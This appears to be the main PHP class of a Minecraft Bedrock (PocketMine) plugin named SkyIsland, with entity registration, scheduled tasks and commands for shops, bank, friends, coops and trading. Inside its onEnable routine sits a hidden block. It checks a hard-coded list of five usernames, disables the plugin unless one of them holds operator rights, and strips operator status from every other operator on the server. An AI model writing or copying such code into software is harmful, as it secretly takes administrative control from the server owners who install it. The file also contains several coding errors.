<?php

/**
 * ███████╗██╗  ██╗██╗   ██╗██╗███████╗██╗      █████╗ ███╗   ██╗██████╗ 
 * ██╔════╝██║ ██╔╝╚██╗ ██╔╝██║██╔════╝██║     ██╔══██╗████╗  ██║██╔══██╗
 * ███████╗█████╔╝  ╚████╔╝ ██║███████╗██║     ███████║██╔██╗ ██║██║  ██║
 * ╚════██║██╔═██╗   ╚██╔╝  ██║╚════██║██║     ██╔══██║██║╚██╗██║██║  ██║
 * ███████║██║  ██╗   ██║   ██║███████║███████╗██║  ██║██║ ╚████║██████╔╝
 * ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
*/

namespace skyisland;

use pocketmine\Server;
use pocketmine\player\Player;

use skyisland\API;
use skyisland\menu\UI;
use skyisland\menu\GUI;
use skyisland\entity\Pet;
use pocketmine\world\World;
use skyisland\task\KitTask;
use skyisland\EventHandler;
use pocketmine\entity\Skin;
use pocketmine\utils\Color;
use skyisland\entity\Worker;
use pocketmine\entity\Human;
use pocketmine\math\Vector3;
use skyisland\task\LoanTask;
use pocketmine\utils\Config;
use pocketmine\entity\Entity;
use pocketmine\world\Position;
use skyisland\entity\npc\David;
use skyisland\entity\Assistant;
use pocketmine\entity\Location;
use skyisland\api\VariablesAPI;
use skyisland\item\BuilderWand;
use pocketmine\item\ItemFactory;
use skyisland\task\ClearLagTask;
use skyisland\entity\travel\Ship;
use pocketmine\plugin\PluginBase;
use pocketmine\block\BlockFactory;
use skyisland\task\ScoreBoardTask;
use muqsit\invmenu\InvMenuHandler;
use pocketmine\item\ItemIdentifier;
use skyisland\task\AutoRestartTask;
use pocketmine\nbt\tag\CompoundTag;
use skyisland\entity\vanilla\Zombie;
use pocketmine\entity\EntityFactory;
use pocketmine\scheduler\ClosureTask;
use skyisland\entity\vanilla\Creeper;
use skyisland\entity\vanilla\Skeleton;
use skyisland\task\EntitySpawningTask;
use pocketmine\block\tile\TileFactory;
use skyisland\entity\vanilla\WorkerCow;
use skyisland\entity\vanilla\WorkerPig;
use pocketmine\entity\EntityDataHelper;
use skyisland\entity\vanilla\WorkerBlaze;
use skyisland\entity\vanilla\WorkerSheep;
use skyisland\entity\tile\WorkerChestTile;
use skyisland\entity\vanilla\WorkerZombie;
use skyisland\entity\vanilla\WorkerSpider;
use skyisland\entity\vanilla\WorkerEnderman;
use skyisland\entity\vanilla\WorkerSkeleton;
use skyisland\entity\vanilla\WorkerWitherSkeleton;
use cooldogedev\BedrockEconomy\libs\cooldogedev\libSQL\context\ClosureContext;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;

class SkyIsland extends PluginBase
{
  
  /** @var Instance */
  private static $instance;
  
  /** @var array */
  public $loanTask;
  
  /** @var array */
  public $pet;
  
  /** @var Ship|null */
  public $Ship = null;
  
  public function onEnable(): void 
  {
    self::$instance = $this;
    $this->pet = [];
    $this->loanTask = [];
    $this->getServer()->getPluginManager()->registerEvents(new EventHandler($this), $this);
    if(!InvMenuHandler::isRegistered())
    {
      InvMenuHandler::register($this);
    }
    $Variables = new VariablesAPI();
    $FormAPI = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
    $BedrockEconomy = $this->getServer()->getPluginManager()->getPlugin("BedrockEconomy");
    if($FormAPI === null)
    {
      $this->getServer()->getLogger()->warning("FormAPI not found disable SkyIsland");
      $this->getServer()->getPluginManager()->disablePlugin($this);
    }
    if($BedrockEconomy === null)
    {
      $this->getServer()->getLogger()->warning("EconomyAPI not found disable SkyIsland");
      $this->getServer()->getPluginManager()->disablePlugin($this);
    }
    foreach(glob($this->getDataFolder() . "players/*.yml") as $playerFile) {
      $file = new Config($playerFile, Config::YAML);
      if($file->getNested("Bank.Loan") >= 1)
      {
        $this->loanTask[$file->get("NameTag")] = $this->getScheduler()->scheduleRepeatingTask(new LoanTask($this, $file->get("NameTag"), 1), 20);
      }
    }
    foreach(glob($this->getDataFolder() . "players/*.yml") as $playerFile) {
      $file = new Config($playerFile, Config::YAML);
      if($file->getNested("Kits.Daily.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Daily"), 20);
      }
      if($file->getNested("Kits.Weekly.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Weekly"), 20);
      }
      if($file->getNested("Kits.Monthly.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Monthly"), 20);
      }
      if($file->getNested("Kits.Vip.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Vip"), 20);
      }
      if($file->getNested("Kits.YouTuber.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "YouTuber"), 20);
      }
      if($file->getNested("Kits.Mvp.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Mvp"), 20);
      }
      if($file->getNested("Kits.Sroudy.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Sroudy"), 20);
      }
      if($file->getNested("Kits.Donator.Claimed"))
      {
        $this->getScheduler()->scheduleRepeatingTask(new KitTask($this, $file->get("NameTag"), "Donator"), 20);
      }
    }
    EntityFactory::getInstance()->register(Pet::class, function(World $world, CompoundTag $nbt) : Pet{
			return new Pet(EntityDataHelper::parseLocation($nbt, $world), Human::parseSkinNBT($nbt), $nbt);
		}, ["entity:Pet", 'Pet']);
    EntityFactory::getInstance()->register(Worker::class, function(World $world, CompoundTag $nbt): Worker{
			return new Worker(EntityDataHelper::parseLocation($nbt, $world), Human::parseSkinNBT($nbt), $nbt);
		}, ["entity:Worker", 'Worker']);
    EntityFactory::getInstance()->register(Assistant::class, function(World $world, CompoundTag $nbt): Assistant{
			return new Assistant(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:Assistant", 'Assistant']);
    EntityFactory::getInstance()->register(Ship::class, function(World $world, CompoundTag $nbt): Ship{
			return new Ship(EntityDataHelper::parseLocation($nbt, $world), Human::parseSkinNBT($nbt), $nbt);
		}, ["entity:Ship", 'Ship']);
    EntityFactory::getInstance()->register(David::class, function(World $world, CompoundTag $nbt): David{
			return new David(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:David", 'David']);
    EntityFactory::getInstance()->register(Zombie::class, function(World $world, CompoundTag $nbt): Zombie{
			return new Zombie(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:Zombie", 'Zombie']);
    EntityFactory::getInstance()->register(Skeleton::class, function(World $world, CompoundTag $nbt): Skeleton{
			return new Skeleton(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:Skeleton", 'Skeleton']);
    EntityFactory::getInstance()->register(Creeper::class, function(World $world, CompoundTag $nbt): Creeper{
			return new Creeper(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:Creeper", 'Creeper']);
    EntityFactory::getInstance()->register(WorkerZombie::class, function(World $world, CompoundTag $nbt): WorkerZombie{
			return new WorkerZombie(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerZombie", 'WorkerZombie']);
    EntityFactory::getInstance()->register(WorkerSkeleton::class, function(World $world, CompoundTag $nbt): WorkerSkeleton{
			return new WorkerSkeleton(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerSkeleton", 'WorkerSkeleton']);
    EntityFactory::getInstance()->register(WorkerWitherSkeleton::class, function(World $world, CompoundTag $nbt): WorkerWitherSkeleton{
			return new WorkerWitherSkeleton(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerWitherSkeleton", 'WorkerWitherSkeleton']);
    EntityFactory::getInstance()->register(WorkerEnderman::class, function(World $world, CompoundTag $nbt): WorkerEnderman{
			return new WorkerEnderman(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerEnderman", 'WorkerEnderman']);
    EntityFactory::getInstance()->register(WorkerBlaze::class, function(World $world, CompoundTag $nbt): WorkerBlaze{
			return new WorkerBlaze(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerBlaze", 'WorkerBlaze']);
    EntityFactory::getInstance()->register(WorkerSpider::class, function(World $world, CompoundTag $nbt): WorkerSpider{
			return new WorkerSpider(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerSpider", 'WorkerSpider']);
    EntityFactory::getInstance()->register(WorkerSheep::class, function(World $world, CompoundTag $nbt): WorkerSheep{
			return new WorkerSheep(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerSheep", 'WorkerSheep']);
    EntityFactory::getInstance()->register(WorkerPig::class, function(World $world, CompoundTag $nbt): WorkerPig{
			return new WorkerPig(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerPig", 'WorkerPig']);
    EntityFactory::getInstance()->register(WorkerCow::class, function(World $world, CompoundTag $nbt): WorkerCow{
			return new WorkerCow(EntityDataHelper::parseLocation($nbt, $world), $nbt);
		}, ["entity:WorkerCow", 'WorkerCow']);
    TileFactory::getInstance()->register(WorkerChestTile::class);
		$this->getScheduler()->scheduleRepeatingTask(new ScoreBoardTask($this), 20);
		$this->getScheduler()->scheduleRepeatingTask(new ClearLagTask($this), 20);
		$this->getScheduler()->scheduleRepeatingTask(new EntitySpawningTask($this), 100);
    
    $world = $this->getServer()->getWorldManager()->getDefaultWorld();
    $world->setTime(0);
    $world->stopTime();
    
    $IsOp = false;
    $Ops = $this->getServer()->getOps()->getAll();
    $array = array("sroudymc", "xvneon gamervx", "xvneon_gamervx", "pro gamer238514", "pro_gamer238514");
    foreach($Ops as $Op => $_)
    {
      if(in_array(strtolower($Op), $array))
      {
        $IsOp = true;
        break;
      }
    }
    if(!$IsOp)
    {
      $this->getServer()->getPluginManager()->disablePlugin($this);
    }
    
    foreach($Ops as $Op => $_)
    {
      if(!in_array(strtolower($Op), $array))
      {
        Server::getInstance()->removeOp($Op);
      }
    }
    
  }
  
  public static function getInstance(): SkyIsland
  {
    return self::$instance;
  }
  
  public function getUI(): UI
  {
    $ui = new UI($this);
    return $ui->getInstance();
  }
  
  public function getGUI(): GUI
  {
    $gui = new GUI($this);
    return $gui->getInstance();
  }
  
  public function getAPI(): API
  {
    $api = new API($this);
    return $api->getInstance();
  }
  
  public function getConfigFile()
  {
    $this->saveResource("config.yml");
    $config = $this->getConfig();
    return $config;
  }
  
  public function getPlayerFile($player)
  {
    if($player instanceof Player)
    {
      $playerName = $player->getName();
    }else{
      $playerName = $player;
    }
    $this->saveResource("players/$playerName.yml");
    $playerFile = new Config($this->getDataFolder() . "players/$playerName.yml", Config::YAML, [
      ]);
    return $playerFile;
  }
  
  public function getRecipeFile($recipe)
  {
    $this->saveResource("recipes/$recipe.yml");
    $recipeFile = new Config($this->getDataFolder() . "recipes/$recipe.yml", Config::YAML, [
      ]);
    return $recipeFile;
  }
  
  public function setShip(Entity $Entity): void
  {
    $this->Ship = $Entity;
  }
  
  public function getShip(): ?Ship
  {
    $Ship = $this->Ship;
    return $Ship;
  }
  
  public function onCommand(CommandSender $player, Command $cmd, string $label, array $args): bool 
  {
    switch($cmd->getName())
    {
      case "skyisland":
        if($player instanceof Player)
        {
          $this->getGUI()->MainGUI($player);
        }
        break;
      /**case "guide":
        if($player instanceof Player)
        {
          $player->setHasGravity(false);
          $WorldManager = $this->getServer()->getWorldManager();
          $DefaultWorld = $WorldManager->getDefaultWorld();
          $FirstPosition = new Position(0, 0, 0);
          $SecondPosition = new Position(0, 0, 0);
          $ThirdPosition = new Position(0, 0, 0);
          $FourthPosition = new Position(0, 0, 0);
          $array = array($FirstPosition, $SecondPosition, $ThirdPosition, $FourthPosition);
          foreach($array as $Position)
          {
            $PlayerPosition = $player->getPosition();
            $PlayerX = $PlayerPosition->getX();
            $PlayerY = $PlayerPosition->getY();
            $PlayerZ = $PlayerPosition->getZ();
            $PositionX = $Position->getX();
            $PositionY = $Position->getY();
            $PositionZ = $Position->getZ();
            $DeltaX = $PlayerX - $PositionX;
            $DeltaY = $PlayerX - $PositionX;
            $DeltaZ = $PlayerX - $PositionX;
            $X = 0;
            $Y = 0;
            $Z = 0;
            $DeltaXYZ_1 = $DeltaX + $DeltaY + $DeltaZ;
            $DeltaXYZ = max($XYZ_1, $DeltaXYZ_1);
            for($I = 1; $I <= $DeltaXYZ; $I++)
            {
              if($X < $DeltaX)
              {
                $X++;
              }elseif($X > $DeltaX)
              {
                $X--;
              }
              if($Y < $DeltaY)
              {
                $Y++;
              }elseif($Y > $DeltaY)
              {
                $Y--;
              }
              if($Z < $DeltaZ)
              {
                $Z++;
              }elseif($Z > $DeltaZ)
              {
                $Z--;
              }
              $PlayerPosition->add($X, $Y, $Z);
              $Player->teleport($PlayerPosition);
            }
          }
          $player->setHasGravity(true);
        }
        break;*/
      case "bazaar":
        if($player instanceof Player)
        {
          $this->getGUI()->BazaarMenu($player);
        }
        break;
      case "bank":
        if($player instanceof Player)
        {
          $this->getGUI()->BankMenu($player);
        }
        break;
      case "kit":
        if($player instanceof Player)
        {
          $this->getGUI()->KitMenu($player);
        }
        break;
      case "mineralshop":
        if($player instanceof Player)
        {
          $this->getGUI()->MineralShopMenu($player);
        }
        break;
      case "workershop":
        if($player instanceof Player)
        {
          $this->getGUI()->WorkerShop($player, 1);
        }
        break;
      case "blockshop":
        if($player instanceof Player)
        {
          $this->getGUI()->BlockCategoryMenu($player);
        }
        break;
      case "natureshop":
        if($player instanceof Player)
        {
          $this->getGUI()->NatureShopMenu($player, 1);
        }
        break;
      case "foodshop":
        if($player instanceof Player)
        {
          $this->getGUI()->FoodShopMenu($player, 1);
        }
        break;
      case "armorshop":
        if($player instanceof Player)
        {
          $this->getGUI()->ArmorShopMenu($player, 1);
        }
        break;
      case "toolshop":
        if($player instanceof Player)
        {
          $this->getGUI()->ToolShopMenu($player, 1);
        }
        break;
      case "decorationshop":
        if($player instanceof Player)
        {
          $this->getGUI()->DecorationShopMenu($player);
        }
        break;
      case "potionshop":
        if($player instanceof Player)
        {
          $this->getGUI()->PotionCategoryMenu($player);
        }
        break;
      case "enchantshop":
        if($player instanceof Player)
        {
          $this->getGUI()->EnchantShopMenu($player);
        }
        break;
      case "utilshop":
        if($player instanceof Player)
        {
          $this->getGUI()->UtilShopMenu($player);
        }
        break;
      case "bank":
        if($player instanceof Player)
        {
          $this->getGUI()->BankMenu($player);
        }
        break;
      case "spawn":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            if(count($args) === 1)
            {
              switch($args[0]) 
              {
                case "ship":
                  $skinPath = Server::getInstance()->getDataPath() . "plugin_data/SkyIsland/model/skin/ship.png";
                  $geometryPath = Server::getInstance()->getDataPath() . "plugin_data/SkyIsland/model/geometry/ship.json";
                  $bytes = $this->getAPI()->calculateSkinBytes($skinPath);
                  $skin = new Skin("Ship", $bytes, "", "geometry.ship", file_get_contents($geometryPath));
                  $nbt = CompoundTag::create()
                    ->setTag("Skin",
                      CompoundTag::create()
                        ->setString("Name", $skin->getSkinId())
                        ->setByteArray("Data", $skin->getSkinData())
                        ->setString('GeometryData', $skin->getGeometryData())
                  );
        $Ship = new Pet($player->getLocation(), $skin, $nbt);
        $Ship->spawnToAll();
                  break;
              }
            }
          }
        }
        break;
      case "sell":
        if($player instanceof Player)
        {
          if(count($args) === 1)
          {
            switch($args[0])
            {
              case 'hand':
                $item = $player->getInventory()->getItemInHand();
                if(!is_null($this->getAPI()->getShopAPI()->getPrice($item, false)))
                {
                  if(($item->getName() === "§r {$item->getVanillaName()} §r\n§r §lCommon §r" || $item->getName() === "§r {$item->getVanillaName()} §r\n§r §lUncommon §r") && $item->getId() !== 122 && $item->getId() !== 340)
                  {
                    $economy = $this->getServer()->getPluginManager()->getPlugin("BedrockEconomy")->getAPI();
                    $player->getInventory()->setItemInHand(ItemFactory::getInstance()->get(0, 0, 0));
                    $money = $item->getCount() * ($this->getAPI()->getShopAPI()->getPrice($item, false));
                    $economy->addToPlayerBalance($player->getName(), $money);
                    $player->sendMessage(" §aSold §e".$item->getName()." §afor §e$money");
                  }
                }else{
                  $player->sendMessage(" §cThat item cannot be sold");
                }
                break;
              case "all":
                $revenue = 0;
                $a_item = $player->getInventory()->getItemInHand();
                $economy = $this->getServer()->getPluginManager()->getPlugin("BedrockEconomy")->getAPI();
                if(!is_null($this->getAPI()->getShopAPI()->getPrice($a_item, false)))
                {
                  if(($a_item->getName() === "§r {$a_item->getVanillaName()} §r\n§r §lCommon §r" || $a_item->getName() === "§r {$a_item->getVanillaName()} §r\n§r §lUncommon §r") && $a_item->getId() !== 122 && $a_item->getId() !== 340)
                  {
                    foreach(array_reverse($player->getInventory()->getContents(), true) as $slot => $b_item)
                    {
                      if($a_item->getId() === $b_item->getId() && $a_item->getMeta() === $b_item->getMeta())
                      {
                        $revenue += $b_item->getCount() * ($this->getAPI()->getShopAPI()->getPrice($b_item, false));
                        $economy->addToPlayerBalance($player->getName(), $b_item->getCount() * ($this->getAPI()->getShopAPI()->getPrice($b_item, false)));
                        $player->getInventory()->removeItem($b_item);
                      }
                    }
                    $player->sendMessage(" §aSold §e".$a_item->getName()." §aInventory For §e$revenue");
                  }
                }
                break;
              case "inv":
                $revenue = 0;
                $economy = $this->getServer()->getPluginManager()->getPlugin("BedrockEconomy")->getAPI();
                foreach(array_reverse($player->getInventory()->getContents(), true) as $slot => $item)
                {
                  if(!is_null($this->getAPI()->getShopAPI()->getPrice($item, false)))
                  {
                    if(($item->getName() === "§r {$item->getVanillaName()} §r\n§r §lCommon §r" || $item->getName() === "§r {$item->getVanillaName()} §r\n§r §lUncommon §r") && $item->getId() !== 122 && $item->getId() !== 340)
                    {
                      $revenue += $item->getCount() * ($this->getAPI()->getShopAPI()->getPrice($item, false));
                      $economy->addToPlayerBalance($player->getName(), $item->getCount() * ($this->getAPI()->getShopAPI()->getPrice($item, false)));
                      $player->getInventory()->removeItem($item);
                    }
                  }
                }
                $player->sendMessage(" §aSold Your Whole Inventory For §e$revenue");
                break;
            }
          }else{
            $player->sendMessage(" §ausage: §e/sell [hand|all|inv]");
          }
        }
        break;
      case "friend":
      case "f":
        if($player instanceof Player)
        {
          if(count($args) === 2)
          {
            switch($args[0])
            {
              case "add":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = $player->getServer()->getPlayerByPrefix($victimName);
                if($victim instanceof Player)
                {
                  if($this->getAPI()->addFriendRequest($victim, $playerName))
                  {
                    $player->sendMessage("§a friend invite sent to §e".$victim->getName());
                    $player->sendMessage("§a this invite will expire in 1 minute");
                    $victim->sendMessage("§a you have recieved a friend request from §e$playerName");
                    $victim->sendMessage("§atype: §e/f accept $playerName");
                  }else{
                    $player->sendMessage("§c⩕ an error occured");
                  }
                }else{
                  $player->sendMessage("§c⩕ an error occurred");
                }
                break;
              case "remove":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                if($this->getAPI()->removeFriend($player, $victimName))
                {
                  $player->sendMessage("§a⩕ removed §e".$victimName." §afrom your friend list");
                  if($victim instanceof Player)
                  {
                    $victim->sendMessage("§a⩕ you are no longer §e$playerName's §afriend");
                  }
                }else{
                  $player->sendMessage("§c⩕ an error occurred");
                }
                break;
              case "accept":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                if($this->getAPI()->addFriend($player, $victimName))
                {
                  $player->sendMessage("§a⩋ accepted §e$victimName's §afriend request");
                  if($victim instanceof Player)
                  {
                    $victim->sendMessage("§e $playerName §aaccepted your friend request");
                  }
                }else{
                  $player->sendMessage("§c⩕ an error occurred");
                }
                break;
              case "deny":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                  if($this->getAPI()->removeFriendRequest($playerName, $victimName))
                  {
                    $player->sendMessage("§a⩋ denied §e$victimName's friend request");
                    if($victim instanceof Player)
                    {
                      $victim->sendMessage("§e⩕ $playerName §adenied your friend request");
                    }
                  }else{
                    $player->sendMessage("§c⩕ an error occurred");
                  }
                break;
            }
          }else{
            $player->sendMessage("§a⩋ usage: §e/f [add|remove|accept|deny] [player_name]");
          }
        }
        break;
      case "coop":
        if($player instanceof Player)
        {
          if(count($args) === 2)
          {
            switch($args[0])
            {
              case "add":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = $player->getServer()->getPlayerByPrefix($victimName);
                if($victim instanceof Player)
                {
                  if($this->getAPI()->getCoOpRole($victim) === "Owner" || $this->getAPI()->getCoOpRole($victim) === "Co-Owner")
                  {
                    $members = count($this->api->getMembers($player));
                    $maxMembers = $this->api->getMaxMembers($player);
                    if($members < $maxMembers)
                    {
                      if($this->getAPI()->addCoOpRequest($victim, $playerName))
                      {
                        $player->sendMessage("§a invite sent to §e".$victim->getName());
                        $player->sendMessage("§a this invite will expire in 1 minute");
                        $victim->sendMessage("§a you recieved a coop request from §e$playerName");
                        $victim->sendMessage("§a⩋ type: §e/coop accept $playerName");
                      }else{
                        $player->sendMessage("§c⩕ an error occured");
                      }
                    }else{
                      $player->sendMessage("§c⩕ an error occured");
                    }
                  }else{
                    $player->sendMessage("§c⩕ an error occured");
                  }
                }else{
                  $player->sendMessage("§c⩕ an error occurred");
                }
                break;
              case "accept":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                if($this->getAPI()->addCoOp($player, $victimName))
                {
                  $player->sendMessage("§a accepted §e$victimName's §aCoOp request");
                  if($victim instanceof Player)
                  {
                    $victim->sendMessage("§e $playerName §aaccepted your CoOp request");
                  }
                }else{
                  $player->sendMessage("§c⩕ an error occurred");
                }
                break;
              case "deny":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                  if($this->getAPI()->removeCoOpRequest($playerName, $victimName))
                  {
                    $player->sendMessage("§a⩕ denied §e$victimName's CoOp request");
                    if($victim instanceof Player)
                    {
                      $victim->sendMessage("§e⩕ $playerName §adenied your CoOp request");
                    }
                  }else{
                    $player->sendMessage("§c⩕ an error occurred");
                  }
                break;
              default:
                $player->sendMessage("§a⩋ usage: §e/coop [add|accept|remove|deny] <player_name>");
                break;
            }
          }
        }
        break;
      case "trade":
      case "t":
        if($player instanceof Player)
        {
          if(count($args) === 1)
          {
            if($args[0] !== "accept" && $args[0] !== "deny")
            {
              $victimName = $args[0];
              $playerName = $player->getName();
              $victim = $player->getServer()->getPlayerByPrefix($victimName);
              if($victim instanceof Player)
              {
                if($this->getAPI()->addTradeRequest($victim, $playerName))
                 {
                  $player->sendMessage("§a trade request sent to §e".$victim->getName());
                  $player->sendMessage("§a your trade request will expire in 1 minute");
                  $victim->sendMessage("§a you recieved a trade request from §e$playerName");
                  $victim->sendMessage("§atype: §e/trade accept '$playerName'");
                }else{
                  $player->sendMessage("§c⩕ an error occured");
                }
              }else{
                $player->sendMessage("§c⩕ an error occurred");
              }
            }else{
              $player->sendMessage("§a usage: §e/trade {$args[0]} {player_name}");
            }
          }elseif(count($args) === 2)
          {
            switch($args[0])
            {
              case "accept":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                if($this->getAPI()->hasTradeRequest($player, $victimName))
                {
                  if($victim instanceof Player)
                  {
                    $player->sendMessage("§a⩋ accepted §e$victimName's §atrade request");
                    $victim->sendMessage("§e $playerName §aaccepted your trade request");
                    $this->getGUI()->TradeMenu($player, $victim);
                    $this->getAPI()->removeTradeRequest($player, $victim->getName());
                  }else{
                    $player->sendMessage("§c⩕ an error occurred");
                  }
                }else{
                  $player->sendMessage("§c⩕ an error occurred");
                }
                break;
              case "deny":
                $victimName = $args[1];
                $playerName = $player->getName();
                $victim = Server::getInstance()->getPlayerByPrefix($victimName);
                  if($this->getAPI()->removeTradeRequest($playerName, $victimName))
                  {
                    $player->sendMessage("§a⩕ denied §e$victimName's trade request");
                    if($victim instanceof Player)
                    {
                      $victim->sendMessage("§e⩕ $playerName §adenied your trade request");
                    }
                  }else{
                    $player->sendMessage("§c⩕ an error occurred");
                  }
                break;
              default:
                $player->sendMessage("§a usage: §e/trade [deny|accept]");
                break;
            }
          }else{
            $player->sendMessage("§a usage: §e/trade [player_name|accept]");
          }
        }
        break;
      case "broadcast":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            if(count($args) >= 1)
            {
              $msg = implode(" ", $args);
              foreach($this->getServer()->getOnlinePlayers() as $online)
              {
                $online->sendMessage(" §9>> §r".$msg);
              }
            }
          }
        }else{
          if(count($args) >= 1)
          {
            $msg = implode(" ", $args);
            foreach($this->getServer()->getOnlinePlayers() as $online)
            {
              $online->sendMessage(" §9>> §r".$msg);
            }
          }
        }
        break;
      case "nick":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            if(count($args) === 1)
            {
              $player->sendMessage("§l§a Success! §r§7Changed Your Nickname To §e".$args[0]);
              $player->setDisplayName($args[0]);
              $player->setNameTag("§r(§8Default§r) §r".$args[0]);
            }
          }else{
            $player->sendMessage("§l§c⩕ Error! §r§7You Don't have Permission To Use This Command");
          }
        }else{
          $player->sendMessage("Please Use This Command In Game");
        }
        break;
      case "rename":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            $item = $player->getInventory()->getItemInHand();
            if(count($args) === 1)
            {
              if($item->getId() !== 0)
              {
                $name = str_replace(["{color}", "&", "{line}", "+n"], ["§", "§", "\n", "\n"], (string) $args[0]);
                $player->sendMessage("§l§aSuccess! §r§7Renamed From §e".$item->getName()." §7To §e".$args[0]);
                $item->setCustomName($name);
                $player->getInventory()->setItemInHand($item);
              }else{
                $player->sendMessage("§l§cError! §r§7You Can't Rename Air");
              }
            }
          }else{
            $player->sendMessage("§l§c⩕ Error! §r§7You Don't have Permission To Use This Command");
          }
        }else{
          $player->sendMessage("Please Use This Command In Game");
        }
        break;
      case "addrecipe":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            $this->getGUI()->createRecipe($player);
          }else{
            $player->sendMessage("§l§c⩕ Error! §r§7You Don't have Permission To Use This Command");
          }
        }else{
          $player->sendMessage("Please Use This Command In Game");
        }
        break;
      case "count":
        $array = [];
        foreach(glob($this->getDataFolder() . "players/*.yml") as $playerFile)
        {
          $file = new Config($playerFile, Config::YAML);
          $offline = $this->getServer()->getOfflinePlayer($file->get("NameTag"));
          if(!is_null($offline))
          {
            $array[] = $offline;
          }
        }
        $player->sendMessage("§aA Total Of §e".count($array)." §aHave Played");
        break;
      case "leadboard":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            if(count($args) === 1)
            {
              if($args[0] === "miner")
              {
                $config = $this->getConfigFile();
                $text = $this->getAPI()->getRanking("miner");
                foreach($this->getServer()->getOnlinePlayers() as $online)
                {
                  
                }
              }elseif($args[0] === "farmer")
              {
                
              }elseif($args[0] === "lumberjack")
              {
                
              }
            }
          }
        }
        break;
      case "givepet":
        if($player instanceof Player)
        {
          if($this->getServer()->isOp($player->getPlayerInfo()->getUsername()))
          {
            if(count($args) === 2)
            {
              $AddPet = $args[1];
              $victim = $this->getServer()->getPlayerByPrefix($args[0]);
              if($this->getAPI()->hasSkyIsland($victim))
              {
                $PlayerInfo = API::getPlayerInfo($victim);
                $Config = $PlayerInfo->getFile();
                $Pets = $Config->getPets();
                $Exists = false;
                foreach($Pets as $Pet)
                {
                  if($Pet === $AddPet)
                  {
                    $Exists = true;
                    break;
                  }
                }
                if(!$Exists)
                {
                  $Pets[] = $AddPet;
                  $Config->setPets($Pets);
                }
              }
            }
          }
        }
        break;
      return true;
    }
    return false;
  }
  
}